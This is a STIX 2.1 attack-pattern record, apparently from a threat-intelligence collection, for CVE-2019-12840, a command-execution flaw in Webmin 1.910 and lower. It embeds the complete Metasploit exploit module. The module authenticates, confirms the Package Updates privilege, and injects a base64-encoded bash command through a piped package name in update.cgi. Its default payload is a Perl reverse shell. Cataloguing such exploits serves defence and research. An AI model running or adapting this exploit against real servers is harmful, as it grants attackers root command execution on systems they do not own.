{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--b1a480b8-929a-41ac-8f37-7533db64e5a8",
    "created": "2024-08-14T17:04:41.881907Z",
    "modified": "2024-08-14T17:04:41.881911Z",
    "name": "Webmin Package Updates Remote Command Execution",
    "description": "( This module exploits an arbitrary command execution vulnerability in Webmin 1.910 and lower versions. Any user authorized to the \"Package Updates\" module can execute arbitrary commands with root privileges. )",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/linux/http/webmin_packageup_rce.rb",
            "external_id": "webmin_packageup_rce.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2019-12840"
        },
        {
            "source_name": "reference",
            "url": "https://www.pentest.com.tr/exploits/Webmin-1910-Package-Updates-Remote-Command-Execution.html"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = ExcellentRanking\n\n  include Msf::Exploit::Remote::HttpClient\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'           => 'Webmin Package Updates Remote Command Execution',\n      'Description'    => %q(\n        This module exploits an arbitrary command execution vulnerability in Webmin\n        1.910 and lower versions. Any user authorized to the \"Package Updates\"\n        module can execute arbitrary commands with root privileges.\n      ),\n      'Author'         => [\n        'AkkuS <\u00d6zkan Mustafa Akku\u015f>' # Vulnerability Discovery, MSF PoC module\n      ],\n      'License'        => MSF_LICENSE,\n      'References'     =>\n        [\n          ['CVE', '2019-12840'],\n          ['URL', 'https://www.pentest.com.tr/exploits/Webmin-1910-Package-Updates-Remote-Command-Execution.html']\n        ],\n      'Privileged'     => true,\n      'Payload'        =>\n        {\n          'DisableNops' => true,\n          'Space'       => 512,\n          'Compat'      =>\n            {\n              'PayloadType' => 'cmd'\n            }\n        },\n      'DefaultOptions' =>\n        {\n          'RPORT' => 10000,\n          'SSL'   => false,\n          'PAYLOAD' => 'cmd/unix/reverse_perl'\n        },\n      'Platform'       => 'unix',\n      'Arch'           => ARCH_CMD,\n      'Targets'        => [['Webmin <= 1.910', {}]],\n      'DisclosureDate' => '2019-05-16',\n      'DefaultTarget'  => 0)\n    )\n    register_options [\n        OptString.new('USERNAME',  [true, 'Webmin Username']),\n        OptString.new('PASSWORD',  [true, 'Webmin Password']),\n        OptString.new('TARGETURI',  [true, 'Base path for Webmin application', '/'])\n    ]\n  end\n\n  def peer\n    \"#{ssl ? 'https://' : 'http://' }#{rhost}:#{rport}\"\n  end\n\n  def login\n    res = send_request_cgi({\n      'method' => 'POST',\n      'uri' => normalize_uri(target_uri, 'session_login.cgi'),\n      'cookie' => 'testing=1', # it must be used for \"Error - No cookies\"\n      'vars_post' => {\n        'page' => '',\n        'user' => datastore['USERNAME'],\n        'pass' => datastore['PASSWORD']\n      }\n    })\n\n    if res && res.code == 302 && res.get_cookies =~ /sid=(\\w+)/\n      return $1\n    end\n\n    return nil unless res\n    ''\n  end\n\n  def check\n    cookie = login\n    return CheckCode::Detected if cookie == ''\n    return CheckCode::Unknown if cookie.nil?\n\n    vprint_status('Attempting to execute...')\n    # check version\n    res = send_request_cgi({\n      'method' => 'GET',\n      'uri'    => normalize_uri(target_uri.path, \"sysinfo.cgi\"),\n      'cookie'  => \"sid=#{cookie}\",\n      'vars_get' => { \"xnavigation\" => \"1\" }\n    })\n\n    if res && res.code == 302 && res.body\n      version = res.body.split(\"- Webmin 1.\")[1]\n      return CheckCode::Detected if version.nil?\n      version = version.split(\" \")[0]\n      if version <= \"910\"\n        # check package update priv\n        res = send_request_cgi({\n          'uri'     => normalize_uri(target_uri.path, \"package-updates/\"),\n          'cookie'  => \"sid=#{cookie}\"\n        })\n\n        if res && res.code == 200 && res.body =~ /Software Package Update/\n          print_status(\"NICE! #{datastore['USERNAME']} has the right to >>Package Update<<\")\n          return CheckCode::Vulnerable\n        end\n      end\n    end\n    print_error(\"#{datastore['USERNAME']} doesn't have the right to >>Package Update<<\")\n    print_status(\"Please try with another user account!\")\n    CheckCode::Safe\n  end\n\n  def exploit\n    cookie = login\n    if cookie == '' || cookie.nil?\n      fail_with(Failure::Unknown, 'Failed to retrieve session cookie')\n    end\n    print_good(\"Session cookie: #{cookie}\")\n\n    res = send_request_cgi(\n      'method' => 'POST',\n      'uri' => normalize_uri(target_uri, 'proc', 'index_tree.cgi'),\n      'headers' => { 'Referer' => \"#{peer}/sysinfo.cgi?xnavigation=1\" },\n      'cookie' => \"sid=#{cookie}\"\n    )\n    unless res && res.code == 200\n      fail_with(Failure::Unknown, 'Request failed')\n    end\n\n    print_status(\"Attempting to execute the payload...\")\n    run_update(cookie)\n  end\n\n  def run_update(cookie)\n    @b64p = Rex::Text.encode_base64(payload.encoded)\n    perl_payload = 'bash -c \"{echo,' + \"#{@b64p}\" + '}|{base64,-d}|{bash,-i}\"'\n    payload = Rex::Text.uri_encode(perl_payload)\n\n    res = send_request_cgi(\n      {\n        'method' => 'POST',\n        'cookie' => \"sid=#{cookie}\",\n        'ctype'  => 'application/x-www-form-urlencoded',\n        'uri' => normalize_uri(target_uri.path, 'package-updates', 'update.cgi'),\n        'headers' =>\n          {\n            'Referer' => \"#{peer}/package-updates/?xnavigation=1\"\n          },\n        'data' => \"u=acl%2Fapt&u=%20%7C%20#{payload}&ok_top=Update+Selected+Packages\"\n      })\n  end\nend\n\n",
    "x_mitre_disclosure_date": "2019-05-16",
    "x_mitre_platforms": [
        "unix'"
    ]
}